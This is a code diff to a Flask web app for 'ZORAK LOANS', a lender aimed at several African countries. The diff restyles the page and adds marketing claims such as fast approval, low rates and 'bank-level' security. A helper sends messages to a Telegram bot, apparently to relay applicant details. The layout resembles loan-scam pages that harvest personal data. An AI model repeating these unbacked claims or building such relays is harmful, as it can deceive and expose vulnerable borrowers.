@@ -6,7 +6,7 @@ N = chr(10)
 W = 'https://wa.me/message/CFCJWLOZ7IWZK1'
 B = os.environ.get('BOT_TOKEN')
 C = os.environ.get('CHAT_ID')
-H = '<style>body{margin:0;background:#f2f7f2;font-family:Arial}.top{background:#0a5c36;color:#fff;padding:18px;text-align:center}.wrap{max-width:520px;margin:16px auto;padding:0 14px}.card{background:#fff;border-radius:16px;padding:20px}.btn{background:#0a5c36;color:#fff;padding:14px;border-radius:12px;display:block;text-align:center;text-decoration:none}.btn2{background:#ffc107;color:#111}.big{font-size:28px;color:#0a5c36}.muted{color:#666}</style><div class=top><b>ZORAK LOANS</b><div>Zambia | Zimbabwe | Tanzania | Ghana</div></div>'
+H = '<style>body{margin:0;background:#f2f7f2;font-family:Arial;font-size:19px}.top{background:#0a5c36;color:#fff;padding:22px;text-align:center}.top b{font-size:32px}.wrap{max-width:560px;margin:16px auto;padding:0 14px}.card{background:#fff;border-radius:20px;padding:26px}.card h1{font-size:34px}.btn{background:#0a5c36;color:#fff;padding:20px;border-radius:14px;display:block;text-align:center;text-decoration:none;font-size:22px;font-weight:bold}.btn2{background:#ffc107;color:#111}.big{font-size:42px;color:#0a5c36;font-weight:bold}.muted{color:#666;font-size:17px}input,select{width:100%;padding:16px;font-size:19px;border-radius:12px;border:1px solid #ddd;box-sizing:border-box}</style><div class=top><b>ZORAK LOANS</b><div style="font-size:17px">Zambia | Zimbabwe | Tanzania | Ghana</div></div>'
 def send(t):
     try:
         u = 'https://api.telegram.org/bot' + B + '/sendMessage'
@@ -16,7 +16,7 @@ def send(t):
 @app.route('/')
 @app.route('/api')
 def home():
-    return H + '<div class=wrap><div class=card><h1>Need cash today?</h1><p>Country</p><select id=c><option>Zambia</option><option>Zimbabwe</option><option>Tanzania</option><option>Ghana</option></select><p>Amount</p><input id=a value=5000><p>Term</p><input id=n value=12><p>Monthly Payment</p><div class=big id=m></div><button class=btn onclick=calc()>Calculate</button><br><a class="btn btn2" href=/apply-form>APPLY NOW</a><br><a class=btn href=' + W + '>WhatsApp</a></div></div><script>function calc(){var a=document.getElementById("a").value;var n=document.getElementById("n").value;var r=0.08/12;var m=a*r/(1-Math.pow(1+r,-n));document.getElementById("m").innerText=m.toFixed(2)}calc()</script>'
+    return H + '<div class=wrap><div class=card><h1>Get Your Loan Approved Fast</h1><p class=muted>Quick approval - Low rates - Flexible terms</p><h2>Loan Calculator</h2><p>Loan Amount</p><input id=a value=5000><p>Loan Term (months)</p><input id=n value=12><p>Monthly Payment</p><div class=big id=m></div><br><button class=btn onclick=calc()>Calculate</button><br><a class="btn btn2" href=/apply-form>APPLY NOW</a><br><a class=btn href=' + W + '>Chat on WhatsApp</a></div><br><div class=card><h2>Why Zorak?</h2><p>⚡ Fast Approval Within 24 hours</p><p>💰 Low Rates From 8%</p><p>🔒 Secure Bank-level</p><p>📱 Apply in 2 mins</p></div><br><div class=card><h2>How it works</h2><p>1. Fill form - 2 mins</p><p>2. We call you - 30 mins</p><p>3. Cash in your account</p></div></div><script>function calc(){var a=document.getElementById("a").value;var n=document.getElementById("n").value;var r=0.08/12;var m=a*r/(1-Math.pow(1+r,-n));document.getElementById("m").innerText="$"+m.toFixed(2)}calc()</script>'
 @app.route('/apply-form')
 @app.route('/api/apply-form')
 def form():
